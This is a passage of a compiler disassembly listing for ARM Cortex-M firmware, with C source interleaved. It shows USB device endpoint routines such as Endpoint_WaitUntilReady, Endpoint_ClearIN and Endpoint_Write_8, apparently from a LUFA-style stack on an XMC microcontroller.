__attribute__((always_inline)) __STATIC_INLINE void __DSB(void)
{
  __ASM volatile ("dsb 0xF":::"memory");
 8002d10:	f3bf 8f4f 	dsb	sy
}
 8002d14:	bf00      	nop
  __ASM volatile ("isb 0xF":::"memory");
 8002d16:	f3bf 8f6f 	isb	sy
}
 8002d1a:	bf00      	nop
}
 8002d1c:	bf00      	nop
 8002d1e:	370c      	adds	r7, #12
 8002d20:	46bd      	mov	sp, r7
 8002d22:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002d26:	4770      	bx	lr
 8002d28:	e000e100 	.word	0xe000e100

08002d2c <Endpoint_WaitUntilReady>:
#define USB_STREAM_TIMEOUT_MS 100

extern volatile uint8_t zlp_flag;

uint8_t Endpoint_WaitUntilReady(void)
{
 8002d2c:	b580      	push	{r7, lr}
 8002d2e:	b086      	sub	sp, #24
 8002d30:	af00      	add	r7, sp, #0
	#if (USB_STREAM_TIMEOUT_MS < 0xFF)
	uint8_t  TimeoutMSRem = USB_STREAM_TIMEOUT_MS;
 8002d32:	2364      	movs	r3, #100	; 0x64
 8002d34:	75fb      	strb	r3, [r7, #23]
			 *  \return Current USB frame number from the USB controller.
			 */
    
            static inline uint16_t USB_Device_GetFrameNumber(void) ATTR_ALWAYS_INLINE;
            static inline uint16_t USB_Device_GetFrameNumber(void) {
                return device.Driver->GetFrameNumber();
 8002d36:	4b44      	ldr	r3, [pc, #272]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002d38:	681b      	ldr	r3, [r3, #0]
 8002d3a:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8002d3c:	4798      	blx	r3
 8002d3e:	4603      	mov	r3, r0
	#else
	uint16_t TimeoutMSRem = USB_STREAM_TIMEOUT_MS;
	#endif

	uint16_t PreviousFrameNumber = USB_Device_GetFrameNumber();
 8002d40:	82bb      	strh	r3, [r7, #20]
	 *  \return The currently selected endpoint's direction, as a \c ENDPOINT_DIR_* mask.
	 */
	static inline uint8_t Endpoint_GetEndpointDirection(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
	static inline uint8_t Endpoint_GetEndpointDirection(void)
	{
		USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 8002d42:	4b41      	ldr	r3, [pc, #260]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002d44:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002d48:	461a      	mov	r2, r3
 8002d4a:	232c      	movs	r3, #44	; 0x2c
 8002d4c:	fb02 f303 	mul.w	r3, r2, r3
 8002d50:	4a3d      	ldr	r2, [pc, #244]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002d52:	4413      	add	r3, r2
 8002d54:	3304      	adds	r3, #4
 8002d56:	60fb      	str	r3, [r7, #12]
		return ep->Address & ENDPOINT_DIR_MASK;
 8002d58:	68fb      	ldr	r3, [r7, #12]
 8002d5a:	781b      	ldrb	r3, [r3, #0]
 8002d5c:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8002d60:	b2db      	uxtb	r3, r3

	for (;;)
	{
		if (Endpoint_GetEndpointDirection() == ENDPOINT_DIR_IN)
 8002d62:	2b80      	cmp	r3, #128	; 0x80
 8002d64:	d122      	bne.n	8002dac <Endpoint_WaitUntilReady+0x80>
		USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 8002d66:	4b38      	ldr	r3, [pc, #224]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002d68:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002d6c:	461a      	mov	r2, r3
 8002d6e:	232c      	movs	r3, #44	; 0x2c
 8002d70:	fb02 f303 	mul.w	r3, r2, r3
 8002d74:	4a34      	ldr	r2, [pc, #208]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002d76:	4413      	add	r3, r2
 8002d78:	3304      	adds	r3, #4
 8002d7a:	60bb      	str	r3, [r7, #8]
		return ep->InInUse == 0 && ep->IsEnabled;
 8002d7c:	68bb      	ldr	r3, [r7, #8]
 8002d7e:	685b      	ldr	r3, [r3, #4]
 8002d80:	f3c3 1300 	ubfx	r3, r3, #4, #1
 8002d84:	b2db      	uxtb	r3, r3
 8002d86:	2b00      	cmp	r3, #0
 8002d88:	d108      	bne.n	8002d9c <Endpoint_WaitUntilReady+0x70>
 8002d8a:	68bb      	ldr	r3, [r7, #8]
 8002d8c:	791b      	ldrb	r3, [r3, #4]
 8002d8e:	f003 0302 	and.w	r3, r3, #2
 8002d92:	b2db      	uxtb	r3, r3
 8002d94:	2b00      	cmp	r3, #0
 8002d96:	d001      	beq.n	8002d9c <Endpoint_WaitUntilReady+0x70>
 8002d98:	2301      	movs	r3, #1
 8002d9a:	e000      	b.n	8002d9e <Endpoint_WaitUntilReady+0x72>
 8002d9c:	2300      	movs	r3, #0
 8002d9e:	f003 0301 	and.w	r3, r3, #1
 8002da2:	b2db      	uxtb	r3, r3
		{
			if (Endpoint_IsINReady())
 8002da4:	2b00      	cmp	r3, #0
 8002da6:	d01a      	beq.n	8002dde <Endpoint_WaitUntilReady+0xb2>
			  return ENDPOINT_READYWAIT_NoError;
 8002da8:	2300      	movs	r3, #0
 8002daa:	e048      	b.n	8002e3e <Endpoint_WaitUntilReady+0x112>
		USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 8002dac:	4b26      	ldr	r3, [pc, #152]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002dae:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002db2:	461a      	mov	r2, r3
 8002db4:	232c      	movs	r3, #44	; 0x2c
 8002db6:	fb02 f303 	mul.w	r3, r2, r3
 8002dba:	4a23      	ldr	r2, [pc, #140]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002dbc:	4413      	add	r3, r2
 8002dbe:	3304      	adds	r3, #4
 8002dc0:	607b      	str	r3, [r7, #4]
		return ep->IsOutRecieved;
 8002dc2:	687b      	ldr	r3, [r7, #4]
 8002dc4:	685b      	ldr	r3, [r3, #4]
 8002dc6:	f3c3 1340 	ubfx	r3, r3, #5, #1
 8002dca:	b2db      	uxtb	r3, r3
 8002dcc:	2b00      	cmp	r3, #0
 8002dce:	bf14      	ite	ne
 8002dd0:	2301      	movne	r3, #1
 8002dd2:	2300      	moveq	r3, #0
 8002dd4:	b2db      	uxtb	r3, r3
		}
		else
		{
			if (Endpoint_IsOUTReceived())
 8002dd6:	2b00      	cmp	r3, #0
 8002dd8:	d001      	beq.n	8002dde <Endpoint_WaitUntilReady+0xb2>
			  return ENDPOINT_READYWAIT_NoError;
 8002dda:	2300      	movs	r3, #0
 8002ddc:	e02f      	b.n	8002e3e <Endpoint_WaitUntilReady+0x112>
		}

		uint8_t USB_DeviceState_LCL = USB_DeviceState;
 8002dde:	4b1b      	ldr	r3, [pc, #108]	; (8002e4c <Endpoint_WaitUntilReady+0x120>)
 8002de0:	781b      	ldrb	r3, [r3, #0]
 8002de2:	74fb      	strb	r3, [r7, #19]

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
 8002de4:	7cfb      	ldrb	r3, [r7, #19]
 8002de6:	2b00      	cmp	r3, #0
 8002de8:	d101      	bne.n	8002dee <Endpoint_WaitUntilReady+0xc2>
		  return ENDPOINT_READYWAIT_DeviceDisconnected;
 8002dea:	2302      	movs	r3, #2
 8002dec:	e027      	b.n	8002e3e <Endpoint_WaitUntilReady+0x112>
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
 8002dee:	7cfb      	ldrb	r3, [r7, #19]
 8002df0:	2b05      	cmp	r3, #5
 8002df2:	d101      	bne.n	8002df8 <Endpoint_WaitUntilReady+0xcc>
		  return ENDPOINT_READYWAIT_BusSuspended;
 8002df4:	2303      	movs	r3, #3
 8002df6:	e022      	b.n	8002e3e <Endpoint_WaitUntilReady+0x112>
	 *  \return Boolean \c true if the currently selected endpoint is stalled, \c false otherwise.
	 */
	static inline bool Endpoint_IsStalled(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
	static inline bool Endpoint_IsStalled(void)
	{
		return device.Endpoints[device.CurrentEndpoint].IsHalted == 1 ? true : false;
 8002df8:	4b13      	ldr	r3, [pc, #76]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002dfa:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002dfe:	4619      	mov	r1, r3
 8002e00:	4a11      	ldr	r2, [pc, #68]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002e02:	232c      	movs	r3, #44	; 0x2c
 8002e04:	fb01 f303 	mul.w	r3, r1, r3
 8002e08:	4413      	add	r3, r2
 8002e0a:	7a1b      	ldrb	r3, [r3, #8]
 8002e0c:	f3c3 0380 	ubfx	r3, r3, #2, #1
 8002e10:	b2db      	uxtb	r3, r3
		else if (Endpoint_IsStalled())
 8002e12:	2b00      	cmp	r3, #0
 8002e14:	d001      	beq.n	8002e1a <Endpoint_WaitUntilReady+0xee>
		  return ENDPOINT_READYWAIT_EndpointStalled;
 8002e16:	2301      	movs	r3, #1
 8002e18:	e011      	b.n	8002e3e <Endpoint_WaitUntilReady+0x112>
 8002e1a:	4b0b      	ldr	r3, [pc, #44]	; (8002e48 <Endpoint_WaitUntilReady+0x11c>)
 8002e1c:	681b      	ldr	r3, [r3, #0]
 8002e1e:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8002e20:	4798      	blx	r3
 8002e22:	4603      	mov	r3, r0

		uint16_t CurrentFrameNumber = USB_Device_GetFrameNumber();
 8002e24:	823b      	strh	r3, [r7, #16]

		if (CurrentFrameNumber != PreviousFrameNumber)
 8002e26:	8a3a      	ldrh	r2, [r7, #16]
 8002e28:	8abb      	ldrh	r3, [r7, #20]
 8002e2a:	429a      	cmp	r2, r3
 8002e2c:	d089      	beq.n	8002d42 <Endpoint_WaitUntilReady+0x16>
		{
			PreviousFrameNumber = CurrentFrameNumber;
 8002e2e:	8a3b      	ldrh	r3, [r7, #16]
 8002e30:	82bb      	strh	r3, [r7, #20]

			if (!(TimeoutMSRem--))
 8002e32:	7dfb      	ldrb	r3, [r7, #23]
 8002e34:	1e5a      	subs	r2, r3, #1
 8002e36:	75fa      	strb	r2, [r7, #23]
 8002e38:	2b00      	cmp	r3, #0
 8002e3a:	d182      	bne.n	8002d42 <Endpoint_WaitUntilReady+0x16>
			  return ENDPOINT_READYWAIT_Timeout;
 8002e3c:	2304      	movs	r3, #4
		}
	}
}
 8002e3e:	4618      	mov	r0, r3
 8002e40:	3718      	adds	r7, #24
 8002e42:	46bd      	mov	sp, r7
 8002e44:	bd80      	pop	{r7, pc}
 8002e46:	bf00      	nop
 8002e48:	2000070c 	.word	0x2000070c
 8002e4c:	20000c9c 	.word	0x20000c9c

08002e50 <Endpoint_ClearOUT>:

void Endpoint_ClearOUT(void) {
 8002e50:	b580      	push	{r7, lr}
 8002e52:	b082      	sub	sp, #8
 8002e54:	af00      	add	r7, sp, #0
	USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 8002e56:	4b23      	ldr	r3, [pc, #140]	; (8002ee4 <Endpoint_ClearOUT+0x94>)
 8002e58:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002e5c:	461a      	mov	r2, r3
 8002e5e:	232c      	movs	r3, #44	; 0x2c
 8002e60:	fb02 f303 	mul.w	r3, r2, r3
 8002e64:	4a1f      	ldr	r2, [pc, #124]	; (8002ee4 <Endpoint_ClearOUT+0x94>)
 8002e66:	4413      	add	r3, r2
 8002e68:	3304      	adds	r3, #4
 8002e6a:	607b      	str	r3, [r7, #4]
	/* if we have data left which isn't read yet, we leave this routine to not override it */
	if (ep->IsEnabled == 0)
 8002e6c:	687b      	ldr	r3, [r7, #4]
 8002e6e:	791b      	ldrb	r3, [r3, #4]
 8002e70:	f003 0302 	and.w	r3, r3, #2
 8002e74:	b2db      	uxtb	r3, r3
 8002e76:	2b00      	cmp	r3, #0
 8002e78:	d02f      	beq.n	8002eda <Endpoint_ClearOUT+0x8a>
		return;
	/* First Check whether we have data in the driver */
	ep->OutBytesAvailable = device.Driver->EndpointRead(ep->Address,ep->OutBuffer,ep->OutBufferLength);
 8002e7a:	4b1a      	ldr	r3, [pc, #104]	; (8002ee4 <Endpoint_ClearOUT+0x94>)
 8002e7c:	681b      	ldr	r3, [r3, #0]
 8002e7e:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8002e80:	687a      	ldr	r2, [r7, #4]
 8002e82:	7810      	ldrb	r0, [r2, #0]
 8002e84:	687a      	ldr	r2, [r7, #4]
 8002e86:	6911      	ldr	r1, [r2, #16]
 8002e88:	687a      	ldr	r2, [r7, #4]
 8002e8a:	6952      	ldr	r2, [r2, #20]
 8002e8c:	4798      	blx	r3
 8002e8e:	4603      	mov	r3, r0
 8002e90:	461a      	mov	r2, r3
 8002e92:	687b      	ldr	r3, [r7, #4]
 8002e94:	609a      	str	r2, [r3, #8]
	ep->OutOffset = 0;
 8002e96:	687b      	ldr	r3, [r7, #4]
 8002e98:	2200      	movs	r2, #0
 8002e9a:	60da      	str	r2, [r3, #12]
	/* If we didn't request new data and all data has been read, request new */
	if (!ep->OutInUse && !ep->OutBytesAvailable) {
 8002e9c:	687b      	ldr	r3, [r7, #4]
 8002e9e:	685b      	ldr	r3, [r3, #4]
 8002ea0:	f3c3 03c0 	ubfx	r3, r3, #3, #1
 8002ea4:	b2db      	uxtb	r3, r3
 8002ea6:	2b00      	cmp	r3, #0
 8002ea8:	d118      	bne.n	8002edc <Endpoint_ClearOUT+0x8c>
 8002eaa:	687b      	ldr	r3, [r7, #4]
 8002eac:	689b      	ldr	r3, [r3, #8]
 8002eae:	2b00      	cmp	r3, #0
 8002eb0:	d114      	bne.n	8002edc <Endpoint_ClearOUT+0x8c>
		ep->OutInUse = true;
 8002eb2:	687a      	ldr	r2, [r7, #4]
 8002eb4:	8893      	ldrh	r3, [r2, #4]
 8002eb6:	f043 0308 	orr.w	r3, r3, #8
 8002eba:	8093      	strh	r3, [r2, #4]
		ep->IsOutRecieved = 0;
 8002ebc:	687a      	ldr	r2, [r7, #4]
 8002ebe:	8893      	ldrh	r3, [r2, #4]
 8002ec0:	f36f 1345 	bfc	r3, #5, #1
 8002ec4:	8093      	strh	r3, [r2, #4]
		device.Driver->EndpointReadStart(ep->Address,
 8002ec6:	4b07      	ldr	r3, [pc, #28]	; (8002ee4 <Endpoint_ClearOUT+0x94>)
 8002ec8:	681b      	ldr	r3, [r3, #0]
 8002eca:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8002ecc:	687a      	ldr	r2, [r7, #4]
 8002ece:	7810      	ldrb	r0, [r2, #0]
 8002ed0:	687a      	ldr	r2, [r7, #4]
 8002ed2:	6952      	ldr	r2, [r2, #20]
 8002ed4:	4611      	mov	r1, r2
 8002ed6:	4798      	blx	r3
 8002ed8:	e000      	b.n	8002edc <Endpoint_ClearOUT+0x8c>
		return;
 8002eda:	bf00      	nop
				ep->OutBufferLength);
	}
}
 8002edc:	3708      	adds	r7, #8
 8002ede:	46bd      	mov	sp, r7
 8002ee0:	bd80      	pop	{r7, pc}
 8002ee2:	bf00      	nop
 8002ee4:	2000070c 	.word	0x2000070c

08002ee8 <Endpoint_ClearIN>:

void Endpoint_ClearIN(void)
{
 8002ee8:	b580      	push	{r7, lr}
 8002eea:	b082      	sub	sp, #8
 8002eec:	af00      	add	r7, sp, #0
	USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 8002eee:	4b38      	ldr	r3, [pc, #224]	; (8002fd0 <Endpoint_ClearIN+0xe8>)
 8002ef0:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002ef4:	461a      	mov	r2, r3
 8002ef6:	232c      	movs	r3, #44	; 0x2c
 8002ef8:	fb02 f303 	mul.w	r3, r2, r3
 8002efc:	4a34      	ldr	r2, [pc, #208]	; (8002fd0 <Endpoint_ClearIN+0xe8>)
 8002efe:	4413      	add	r3, r2
 8002f00:	3304      	adds	r3, #4
 8002f02:	607b      	str	r3, [r7, #4]
	int32_t data_count;
	/* don't clear if in use or not enabled */
	if (ep->InInUse == 1 || ep->IsEnabled == 0)
 8002f04:	687b      	ldr	r3, [r7, #4]
 8002f06:	685b      	ldr	r3, [r3, #4]
 8002f08:	f3c3 1300 	ubfx	r3, r3, #4, #1
 8002f0c:	b2db      	uxtb	r3, r3
 8002f0e:	2b01      	cmp	r3, #1
 8002f10:	d059      	beq.n	8002fc6 <Endpoint_ClearIN+0xde>
 8002f12:	687b      	ldr	r3, [r7, #4]
 8002f14:	791b      	ldrb	r3, [r3, #4]
 8002f16:	f003 0302 	and.w	r3, r3, #2
 8002f1a:	b2db      	uxtb	r3, r3
 8002f1c:	2b00      	cmp	r3, #0
 8002f1e:	d052      	beq.n	8002fc6 <Endpoint_ClearIN+0xde>
		return;
	ep->InInUse = true;
 8002f20:	687a      	ldr	r2, [r7, #4]
 8002f22:	8893      	ldrh	r3, [r2, #4]
 8002f24:	f043 0310 	orr.w	r3, r3, #16
 8002f28:	8093      	strh	r3, [r2, #4]
	/* store transfer information to loop over, if underlying is smaller */
	ep->InDataBuffer = ep->InBuffer;
 8002f2a:	687b      	ldr	r3, [r7, #4]
 8002f2c:	69da      	ldr	r2, [r3, #28]
 8002f2e:	687b      	ldr	r3, [r7, #4]
 8002f30:	629a      	str	r2, [r3, #40]	; 0x28
	ep->InDataLeft = ep->InBytesAvailable;
 8002f32:	687b      	ldr	r3, [r7, #4]
 8002f34:	699a      	ldr	r2, [r3, #24]
 8002f36:	687b      	ldr	r3, [r7, #4]
 8002f38:	625a      	str	r2, [r3, #36]	; 0x24
	ep->InBytesAvailable = 0;
 8002f3a:	687b      	ldr	r3, [r7, #4]
 8002f3c:	2200      	movs	r2, #0
 8002f3e:	619a      	str	r2, [r3, #24]
	/* make next 3 operations atomic. Do not get interrupted.*/
	NVIC_DisableIRQ(USB0_0_IRQn);
 8002f40:	206b      	movs	r0, #107	; 0x6b
 8002f42:	f7ff fecf 	bl	8002ce4 <__NVIC_DisableIRQ>
	data_count = device.Driver->EndpointWrite(ep->Address,
 8002f46:	4b22      	ldr	r3, [pc, #136]	; (8002fd0 <Endpoint_ClearIN+0xe8>)
 8002f48:	681b      	ldr	r3, [r3, #0]
 8002f4a:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8002f4c:	687a      	ldr	r2, [r7, #4]
 8002f4e:	7810      	ldrb	r0, [r2, #0]
			ep->InDataBuffer,ep->InDataLeft);
 8002f50:	687a      	ldr	r2, [r7, #4]
 8002f52:	6a91      	ldr	r1, [r2, #40]	; 0x28
	data_count = device.Driver->EndpointWrite(ep->Address,
 8002f54:	687a      	ldr	r2, [r7, #4]
 8002f56:	6a52      	ldr	r2, [r2, #36]	; 0x24
 8002f58:	4798      	blx	r3
 8002f5a:	6038      	str	r0, [r7, #0]
	ep->InDataBuffer += data_count;
 8002f5c:	687b      	ldr	r3, [r7, #4]
 8002f5e:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8002f60:	683b      	ldr	r3, [r7, #0]
 8002f62:	441a      	add	r2, r3
 8002f64:	687b      	ldr	r3, [r7, #4]
 8002f66:	629a      	str	r2, [r3, #40]	; 0x28
	ep->InDataLeft -= data_count;
 8002f68:	687b      	ldr	r3, [r7, #4]
 8002f6a:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8002f6c:	683b      	ldr	r3, [r7, #0]
 8002f6e:	1ad2      	subs	r2, r2, r3
 8002f70:	687b      	ldr	r3, [r7, #4]
 8002f72:	625a      	str	r2, [r3, #36]	; 0x24
	NVIC_EnableIRQ(USB0_0_IRQn);
 8002f74:	206b      	movs	r0, #107	; 0x6b
 8002f76:	f7ff fe97 	bl	8002ca8 <__NVIC_EnableIRQ>
	if((zlp_flag == true) && (ep->Number != 0))
 8002f7a:	4b16      	ldr	r3, [pc, #88]	; (8002fd4 <Endpoint_ClearIN+0xec>)
 8002f7c:	781b      	ldrb	r3, [r3, #0]
 8002f7e:	b2db      	uxtb	r3, r3
 8002f80:	2b01      	cmp	r3, #1
 8002f82:	d121      	bne.n	8002fc8 <Endpoint_ClearIN+0xe0>
 8002f84:	687b      	ldr	r3, [r7, #4]
 8002f86:	781b      	ldrb	r3, [r3, #0]
 8002f88:	f003 030f 	and.w	r3, r3, #15
 8002f8c:	b2db      	uxtb	r3, r3
 8002f8e:	2b00      	cmp	r3, #0
 8002f90:	d01a      	beq.n	8002fc8 <Endpoint_ClearIN+0xe0>
	{
		/*Send a ZLP from here*/
	  while(ep->InInUse)
 8002f92:	bf00      	nop
 8002f94:	687b      	ldr	r3, [r7, #4]
 8002f96:	685b      	ldr	r3, [r3, #4]
 8002f98:	f3c3 1300 	ubfx	r3, r3, #4, #1
 8002f9c:	b2db      	uxtb	r3, r3
 8002f9e:	2b00      	cmp	r3, #0
 8002fa0:	d1f8      	bne.n	8002f94 <Endpoint_ClearIN+0xac>
	  {
		;
	  }
	  ep->InInUse = true;
 8002fa2:	687a      	ldr	r2, [r7, #4]
 8002fa4:	8893      	ldrh	r3, [r2, #4]
 8002fa6:	f043 0310 	orr.w	r3, r3, #16
 8002faa:	8093      	strh	r3, [r2, #4]
	  device.Driver->EndpointWrite(ep->Address,
 8002fac:	4b08      	ldr	r3, [pc, #32]	; (8002fd0 <Endpoint_ClearIN+0xe8>)
 8002fae:	681b      	ldr	r3, [r3, #0]
 8002fb0:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8002fb2:	687a      	ldr	r2, [r7, #4]
 8002fb4:	7810      	ldrb	r0, [r2, #0]
	  			ep->InDataBuffer,0);
 8002fb6:	687a      	ldr	r2, [r7, #4]
 8002fb8:	6a91      	ldr	r1, [r2, #40]	; 0x28
	  device.Driver->EndpointWrite(ep->Address,
 8002fba:	2200      	movs	r2, #0
 8002fbc:	4798      	blx	r3
	  zlp_flag = false;
 8002fbe:	4b05      	ldr	r3, [pc, #20]	; (8002fd4 <Endpoint_ClearIN+0xec>)
 8002fc0:	2200      	movs	r2, #0
 8002fc2:	701a      	strb	r2, [r3, #0]
 8002fc4:	e000      	b.n	8002fc8 <Endpoint_ClearIN+0xe0>
		return;
 8002fc6:	bf00      	nop
	}
}
 8002fc8:	3708      	adds	r7, #8
 8002fca:	46bd      	mov	sp, r7
 8002fcc:	bd80      	pop	{r7, pc}
 8002fce:	bf00      	nop
 8002fd0:	2000070c 	.word	0x2000070c
 8002fd4:	20000708 	.word	0x20000708

08002fd8 <Endpoint_IsReadWriteAllowed>:

bool Endpoint_IsReadWriteAllowed(void) {
 8002fd8:	b480      	push	{r7}
 8002fda:	b083      	sub	sp, #12
 8002fdc:	af00      	add	r7, sp, #0
	USBD_Endpoint_t *EndPoint = &device.Endpoints[device.CurrentEndpoint];
 8002fde:	4b16      	ldr	r3, [pc, #88]	; (8003038 <Endpoint_IsReadWriteAllowed+0x60>)
 8002fe0:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8002fe4:	461a      	mov	r2, r3
 8002fe6:	232c      	movs	r3, #44	; 0x2c
 8002fe8:	fb02 f303 	mul.w	r3, r2, r3
 8002fec:	4a12      	ldr	r2, [pc, #72]	; (8003038 <Endpoint_IsReadWriteAllowed+0x60>)
 8002fee:	4413      	add	r3, r2
 8002ff0:	3304      	adds	r3, #4
 8002ff2:	603b      	str	r3, [r7, #0]
	bool Retval = false;
 8002ff4:	2300      	movs	r3, #0
 8002ff6:	71fb      	strb	r3, [r7, #7]

	if(EndPoint->Direction)
 8002ff8:	683b      	ldr	r3, [r7, #0]
 8002ffa:	781b      	ldrb	r3, [r3, #0]
 8002ffc:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8003000:	b2db      	uxtb	r3, r3
 8003002:	2b00      	cmp	r3, #0
 8003004:	d009      	beq.n	800301a <Endpoint_IsReadWriteAllowed+0x42>
	{
		Retval = (EndPoint->InBytesAvailable < EndPoint->InBufferLength) ? true : false;
 8003006:	683b      	ldr	r3, [r7, #0]
 8003008:	699a      	ldr	r2, [r3, #24]
 800300a:	683b      	ldr	r3, [r7, #0]
 800300c:	6a1b      	ldr	r3, [r3, #32]
 800300e:	429a      	cmp	r2, r3
 8003010:	bf34      	ite	cc
 8003012:	2301      	movcc	r3, #1
 8003014:	2300      	movcs	r3, #0
 8003016:	71fb      	strb	r3, [r7, #7]
 8003018:	e006      	b.n	8003028 <Endpoint_IsReadWriteAllowed+0x50>
	}
	else
	{
		Retval = (EndPoint->OutBytesAvailable > 0) ? true : false;
 800301a:	683b      	ldr	r3, [r7, #0]
 800301c:	689b      	ldr	r3, [r3, #8]
 800301e:	2b00      	cmp	r3, #0
 8003020:	bf14      	ite	ne
 8003022:	2301      	movne	r3, #1
 8003024:	2300      	moveq	r3, #0
 8003026:	71fb      	strb	r3, [r7, #7]
	}
	return Retval;
 8003028:	79fb      	ldrb	r3, [r7, #7]
}
 800302a:	4618      	mov	r0, r3
 800302c:	370c      	adds	r7, #12
 800302e:	46bd      	mov	sp, r7
 8003030:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003034:	4770      	bx	lr
 8003036:	bf00      	nop
 8003038:	2000070c 	.word	0x2000070c

0800303c <Endpoint_Write_8>:

void Endpoint_Write_8(const uint8_t Data) {
 800303c:	b480      	push	{r7}
 800303e:	b085      	sub	sp, #20
 8003040:	af00      	add	r7, sp, #0
 8003042:	4603      	mov	r3, r0
 8003044:	71fb      	strb	r3, [r7, #7]
	USBD_Endpoint_t *EndPoint = &device.Endpoints[device.CurrentEndpoint];
 8003046:	4b17      	ldr	r3, [pc, #92]	; (80030a4 <Endpoint_Write_8+0x68>)
 8003048:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 800304c:	461a      	mov	r2, r3
 800304e:	232c      	movs	r3, #44	; 0x2c
 8003050:	fb02 f303 	mul.w	r3, r2, r3
 8003054:	4a13      	ldr	r2, [pc, #76]	; (80030a4 <Endpoint_Write_8+0x68>)
 8003056:	4413      	add	r3, r2
 8003058:	3304      	adds	r3, #4
 800305a:	60bb      	str	r3, [r7, #8]
	bool Success = false;
 800305c:	2300      	movs	r3, #0
 800305e:	73fb      	strb	r3, [r7, #15]

	 do
	  {
	    if(EndPoint->InBytesAvailable < EndPoint->InBufferLength)
 8003060:	68bb      	ldr	r3, [r7, #8]
 8003062:	699a      	ldr	r2, [r3, #24]
 8003064:	68bb      	ldr	r3, [r7, #8]
 8003066:	6a1b      	ldr	r3, [r3, #32]
 8003068:	429a      	cmp	r2, r3
 800306a:	d20d      	bcs.n	8003088 <Endpoint_Write_8+0x4c>
	    {
	      EndPoint->InBuffer[EndPoint->InBytesAvailable] = Data;
 800306c:	68bb      	ldr	r3, [r7, #8]
 800306e:	69da      	ldr	r2, [r3, #28]
 8003070:	68bb      	ldr	r3, [r7, #8]
 8003072:	699b      	ldr	r3, [r3, #24]
 8003074:	4413      	add	r3, r2
 8003076:	79fa      	ldrb	r2, [r7, #7]
 8003078:	701a      	strb	r2, [r3, #0]
	      EndPoint->InBytesAvailable++;
 800307a:	68bb      	ldr	r3, [r7, #8]
 800307c:	699b      	ldr	r3, [r3, #24]
 800307e:	1c5a      	adds	r2, r3, #1
 8003080:	68bb      	ldr	r3, [r7, #8]
 8003082:	619a      	str	r2, [r3, #24]

	      Success = true;
 8003084:	2301      	movs	r3, #1
 8003086:	73fb      	strb	r3, [r7, #15]
	    }
	  }while(!Success);
 8003088:	7bfb      	ldrb	r3, [r7, #15]
 800308a:	f083 0301 	eor.w	r3, r3, #1
 800308e:	b2db      	uxtb	r3, r3
 8003090:	2b00      	cmp	r3, #0
 8003092:	d1e5      	bne.n	8003060 <Endpoint_Write_8+0x24>
}
 8003094:	bf00      	nop
 8003096:	bf00      	nop
 8003098:	3714      	adds	r7, #20
 800309a:	46bd      	mov	sp, r7
 800309c:	f85d 7b04 	ldr.w	r7, [sp], #4
 80030a0:	4770      	bx	lr
 80030a2:	bf00      	nop
 80030a4:	2000070c 	.word	0x2000070c

080030a8 <Endpoint_Read_8>:

uint8_t Endpoint_Read_8(void) {
 80030a8:	b480      	push	{r7}
 80030aa:	b083      	sub	sp, #12
 80030ac:	af00      	add	r7, sp, #0
	USBD_Endpoint_t *EndPoint = &device.Endpoints[device.CurrentEndpoint];
 80030ae:	4b19      	ldr	r3, [pc, #100]	; (8003114 <Endpoint_Read_8+0x6c>)
 80030b0:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 80030b4:	461a      	mov	r2, r3
 80030b6:	232c      	movs	r3, #44	; 0x2c
 80030b8:	fb02 f303 	mul.w	r3, r2, r3
 80030bc:	4a15      	ldr	r2, [pc, #84]	; (8003114 <Endpoint_Read_8+0x6c>)
 80030be:	4413      	add	r3, r2
 80030c0:	3304      	adds	r3, #4
 80030c2:	603b      	str	r3, [r7, #0]
	bool Success = false;
 80030c4:	2300      	movs	r3, #0
 80030c6:	71fb      	strb	r3, [r7, #7]
	uint8_t data = 0;
 80030c8:	2300      	movs	r3, #0
 80030ca:	71bb      	strb	r3, [r7, #6]
	 do
	  {
		if(EndPoint->OutBytesAvailable > 0)
 80030cc:	683b      	ldr	r3, [r7, #0]
 80030ce:	689b      	ldr	r3, [r3, #8]
 80030d0:	2b00      	cmp	r3, #0
 80030d2:	d012      	beq.n	80030fa <Endpoint_Read_8+0x52>
		{
          data = EndPoint->OutBuffer[EndPoint->OutOffset];
 80030d4:	683b      	ldr	r3, [r7, #0]
 80030d6:	691a      	ldr	r2, [r3, #16]
 80030d8:	683b      	ldr	r3, [r7, #0]
